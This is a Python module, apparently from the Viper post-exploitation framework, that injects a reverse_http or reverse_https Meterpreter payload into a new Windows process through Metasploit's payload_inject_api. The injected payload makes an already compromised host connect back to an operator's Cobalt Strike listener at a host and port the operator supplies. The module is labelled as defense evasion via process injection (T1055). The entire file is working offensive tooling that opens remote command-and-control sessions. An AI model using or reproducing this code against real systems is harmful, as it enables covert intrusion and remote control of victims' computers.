# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "迁移权限到CobaltStrike"
    DESC_ZH = "将CobaltStrike的shellcode注入到新的进程,便于CobaltStrike上线"

    NAME_EN = "Migrate permissions to CobaltStrike"
    DESC_EN = "Inject CobaltStrike's shellcode into a new process to facilitate CobaltStrike's launch"
    MODULETYPE = TAG2TYPE.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1055"]  # ATTCK向量
    REFERENCES = ["https://www.yuque.com/vipersec/module/urdpn7"]
    README = ["https://www.yuque.com/funnywolfdoc/viperdoc/rdtnla"]
    AUTHOR = ["Viper"]

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionEnum(name='payload',
                   tag_zh="Payload类型",
                   desc_zh="根据CobaltStrike的Listener中payload类型进行选择",
                   tag_en="Payload type",
                   desc_en="Choose according to the payload type in CobaltStrike's Listener",

                   required=True,
                   default="reverse_http",
                   enum_list=[
                       {'tag_zh': "windows/beacon_http/reverse_http", 'tag_en': "windows/beacon_http/reverse_http",
                        'value': "reverse_http"},
                       {'tag_zh': "windows/beacon_http/reverse_https", 'tag_en': "windows/beacon_http/reverse_https",
                        'value': "reverse_https"},
                   ],
                   length=24),
        OptionStr("cshost",
                  tag_zh="Host", desc_zh="CS listener的host参数",
                  tag_en="Host", desc_en="CS listener host parameter", required=True),
        OptionInt("csport",
                  tag_zh="Port", desc_zh="CS listener的port参数",
                  tag_en="Port", desc_en="CS listener port parameter",
                  required=True)
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/payload_inject_api"
        self.opts['NEWPROCESS'] = True

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if not session.is_windows:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        if self.param("payload") == "reverse_http":
            self.opts["PAYLOAD"] = "windows/meterpreter/reverse_http"
        else:
            self.opts["PAYLOAD"] = "windows/meterpreter/reverse_https"
        self.opts["LHOST"] = self.param("cshost")
        self.opts["LPORT"] = self.param("csport")
        self.opts['disablepayloadhandler'] = True

        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(f"失败原因:{message}", f"Reason: {message}")
        else:
            self.log_info("模块执行完成", "Module operation completed")
            self.log_good("请在CobaltStrike中查看beacon是否生成", "Please check whether beacon is generated in CobaltStrike")
            self.log_good(f"进程PID: {data.get('pid')}", f"Process PID: {data.get('pid')}")
